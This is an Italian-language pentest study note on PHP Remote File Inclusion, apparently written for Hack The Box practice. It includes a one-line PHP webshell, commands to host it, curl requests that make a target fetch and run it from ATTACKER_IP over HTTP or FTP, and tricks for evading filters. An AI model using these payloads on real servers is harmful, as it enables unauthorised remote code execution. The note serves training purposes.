# RFI Techniques

**Difficolta:** Advanced
**Time to Master:** 1.5h
**Prerequisiti:** [02-LFI-Advanced.md](02-LFI-Advanced.md)
**Lab:** HTB — macchine legacy con allow_url_include

---

## Obiettivo

Sfruttare Remote File Inclusion quando il server include direttamente un file ospitato su un server remoto controllato dall'attaccante: porta a RCE immediata se sfruttabile, ma richiede una configurazione PHP oggi rara (`allow_url_include=On`).

---

## Concetti chiave

### Prerequisiti per RFI (PHP)

```ini
allow_url_fopen = On   ; default On
allow_url_include = On ; default Off dalla 5.2 — raro trovarlo On oggi
```

Senza `allow_url_include=On` la RFI classica non funziona: verifica sempre prima con un LFI locale se il target e vulnerabile a questa configurazione, o cerca altre vie (vedi [Wrappers-PHP.md](Wrappers-PHP.md)).

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| python3 -m http.server | `python3 -m http.server 80` | serve shell.php | server locale per hosting payload |
| curl | `curl "URL?page=http://attacker/shell.php"` | esecuzione remota | conferma RFI |

---

## Payload / Esempi

### Esempio 1: RFI classica con webshell remota

**Setup:**
- Target: PHP con `allow_url_include=On` (raro, verifica sempre)
- Vulnerability: parametro `?page=` che include URL remoti

**Step-by-step:**
```bash
# Step 1: crea shell.php sul tuo host
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: avvia un server HTTP locale
python3 -m http.server 80

# Step 3: forza l'inclusione remota dal target
curl "http://target.com/index.php?page=http://ATTACKER_IP/shell.php&cmd=id"
```

**Output atteso:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Spiegazione:** il target scarica ed esegue direttamente il file PHP remoto come se fosse locale, dando esecuzione di comandi immediata senza bisogno di log poisoning.

### Esempio 2: RFI via FTP invece di HTTP

```bash
curl "http://target.com/index.php?page=ftp://anonymous:pass@ATTACKER_IP/shell.php&cmd=id"
```

**Spiegazione:** utile se il filtro dell'app blocca solo lo schema `http://`/`https://` ma non altri protocolli supportati dai wrapper PHP.

---

## Evasion / Bypass Techniques

### Bypass filtro che richiede l'URL finisca con estensione specifica

```
http://attacker.com/shell.php?ignore=.jpg
http://attacker.com/shell.php%00.jpg   (null byte, PHP < 5.3.4)
```

### Bypass blacklist su "http://"

```
hTtP://attacker.com/shell.php   (case variation, raro che funzioni ma economico da provare)
```

---

## Lab Hands-On

### Lab 1: HTB — macchina legacy con RFI
**Obiettivo:** ottenere RCE via inclusione remota
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Verifica se il parametro accetta URL esterni (prova con un URL innocuo che risponde con contenuto riconoscibile)
2. Host una webshell PHP sul tuo server
3. Forza l'inclusione e ottieni RCE

---

## Common Mistakes

- Dare per scontato che RFI funzioni sempre come LFI -> `allow_url_include=On` e raro nei sistemi moderni, verifica prima di perdere tempo
- Dimenticare di avviare il server locale prima della richiesta -> la request al target fallira silenziosamente

---

## Link Utili

- [PHP Manual — allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php)
- [OWASP Testing Guide — RFI](https://owasp.org/www-project-web-security-testing-guide/)

---

## Connessioni

- **Prerequisito:** [02-LFI-Advanced.md](02-LFI-Advanced.md)
- **Prossimo Step:** [04-Wrappers-PHP.md](04-Wrappers-PHP.md)
- **Combinazione con:** [08-Exploitation-PostEx/03-Reverse-Shells.md](../08-Exploitation-PostEx/03-Reverse-Shells.md)

---

## Checklist di padronanza

- [ ] So verificare se allow_url_include e attivo
- [ ] So hostare e servire una webshell remota
- [ ] Conosco alternative allo schema http:// per RFI

---

## Note personali

_(spazio libero)_
